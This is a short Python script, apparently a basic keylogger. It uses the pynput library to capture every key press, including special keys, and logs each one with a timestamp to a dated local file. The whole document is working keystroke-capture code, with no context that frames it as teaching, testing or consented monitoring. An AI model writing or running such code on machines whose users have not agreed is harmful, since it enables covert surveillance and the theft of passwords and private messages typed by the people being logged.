from pynput import keyboard
import logging
from datetime import datetime

# Setup logging
log_filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_filename, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        logging.info(f"Special key {key} pressed")

# Listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
